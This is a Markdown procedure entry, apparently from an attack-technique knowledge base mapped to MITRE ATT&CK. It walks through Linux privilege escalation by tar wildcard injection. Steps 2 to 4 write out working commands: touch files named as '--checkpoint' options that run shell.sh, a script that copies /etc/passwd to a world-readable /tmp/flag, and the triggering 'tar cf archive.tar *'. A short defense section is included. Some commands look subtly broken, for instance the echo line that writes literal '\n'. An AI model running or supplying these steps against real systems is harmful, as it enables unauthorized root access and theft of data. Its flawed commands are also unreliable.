---
id: 781c347b-9b9a-4252-8408-ff782ee1ab9e
name: Linux-Privilege Escalation via Wildcard and GTFOBins
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.128928+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Command and Scripting Interpreter|T1059.004 - Unix Shell]]'
sub_techniques:
  - >-
    [[techniques/Command and Scripting Interpreter/T1059.004| T1059.004 - Unix
    Shell]]
tags:
  - '[[tags/Linux]]'
  - '[[tags/Privilege Escalation]]'
  - '[[tags/Wildcard Abuse]]'
  - '[[tags/GTFOBins]]'
commands:
  - '[[commands/touch-special-checkpoint-file]]'
  - '[[commands/touch-checkpoint-action-file]]'
  - '[[commands/echo-create-shell-script]]'
  - '[[commands/tar-wildcard-exploit]]'
platforms:
  - Linux
tools:
  - '[[tools/GTFOBins]]'
validated: true
---

# Linux Privilege Escalation via Wildcard and GTFOBins

## Summary

This procedure exploits wildcard expansion vulnerabilities in setuid binaries like tar on Linux systems to achieve privilege escalation. By creating specially crafted files that abuse argument injection during wildcard processing, an attacker can execute arbitrary commands as the elevated user. This technique leverages resources like GTFOBins to identify and implement exploits for common Unix binaries, allowing low-privileged users to gain root access and access sensitive files.

## Description

Wildcard abuse occurs when a setuid binary processes user-supplied input with shell-like wildcard expansion (e.g., '*' in tar), enabling attackers to inject malicious arguments or commands. In this scenario, the target is a Linux system where tar is setuid root, a common misconfiguration. The attacker creates files with names that start with '--' to mimic tar options, tricking the binary into executing a shell script instead of archiving files. This leads to command execution as root, such as reading /etc/passwd or creating accessible files in /tmp. The procedure assumes foothold access (e.g., via initial compromise) and focuses on local escalation. Success grants root shell or data access, enabling further persistence or lateral movement. This maps to real-world attacks where misconfigured SUID binaries are abused for escalation.

## Requirements

1. Low-privileged shell access on a Linux target (e.g., via SSH or RCE).
2. Target system with vulnerable SUID binary like tar (check with `find / -perm -4000 2>/dev/null | grep tar`).
3. Write access to a directory where the vulnerable script or binary is executed (e.g., current working directory).
4. Knowledge of GTFOBins for reference on binary exploits.
5. Bash shell available on target (common on Linux).

## Defense

Defensive measures and detection strategies:

- Remove unnecessary SUID bits from binaries (`chmod u-s /path/to/binary`) and audit with tools like Lynis or custom scripts.
- Use AppArmor or SELinux to confine SUID binaries and prevent wildcard abuse.
- Monitor for suspicious file creations in system directories (e.g., files starting with '--') via auditd or file integrity monitoring (e.g., AIDE).
- Log and alert on privilege escalations using sudo logging, process monitoring (e.g., auditd rules for execve), and anomaly detection in command lines.
- Regularly review GTFOBins-like resources and patch known vulnerable binaries; prefer containerization to isolate privileges.

## Objectives

1. Identify and confirm a vulnerable SUID binary supporting wildcard expansion.
2. Craft and deploy exploit files to inject commands during binary execution.
3. Achieve root-level command execution to access sensitive data or maintain persistence.
4. Verify escalation by reading protected files or spawning a root shell.

## Instructions

### Step 1: Identify Vulnerable Binary

**Context**: First, confirm the presence of a SUID tar binary, as it supports wildcard expansion and is commonly exploitable per GTFOBins. This step ensures the target is vulnerable before proceeding.

Use `find` to locate SUID binaries and grep for tar:

```bash
find / -perm -4000 2>/dev/null | grep tar
```

> This command searches for files with SUID bit set. Expected output: Paths like `/usr/bin/tar` if vulnerable.

If tar is SUID, proceed; otherwise, search GTFOBins for alternatives like `vim` or `find`.

### Step 2: Create Special Checkpoint Files

**Context**: Craft files that abuse tar's option parsing. The '--checkpoint=1' file triggers checkpoint mode, and '--checkpoint-action=exec=sh shell.sh' sets the action to execute a shell script during wildcard expansion.

Execute [[commands/touch-special-checkpoint-file]] to create the checkpoint file:

```bash
touch -- "--checkpoint=1"
```

Then [[commands/touch-checkpoint-action-file]] for the action file:

```bash
touch -- "--checkpoint-action=exec=sh shell.sh"
```

> Expected output: No output on success; verify with `ls -- *` showing files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`. These files inject as tar options when '*' expands.

### Step 3: Create Malicious Shell Script

**Context**: Write a shell script that runs as root upon exploitation, demonstrating escalation by copying /etc/passwd to /tmp/flag and making it world-readable.

Execute [[commands/echo-create-shell-script]]:

```bash
echo "#!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
```

> Expected output: No output; verify with `cat shell.sh` showing the script content. Make it executable if needed: `chmod +x shell.sh`.

### Step 4: Trigger the Exploit

**Context**: Run tar with wildcard to process the directory, causing expansion and execution of the injected shell as root.

Reference the exploit code [[codes/Tar-Wildcard-Abuse-Script]] for the full sequence, then execute [[commands/tar-wildcard-exploit]]:

```bash
tar cf archive.tar *
```

> Expected output: Tar may error on invalid options but will execute the shell.sh as root. Check `/tmp/flag` for /etc/passwd content: `cat /tmp/flag` should show user list including root.
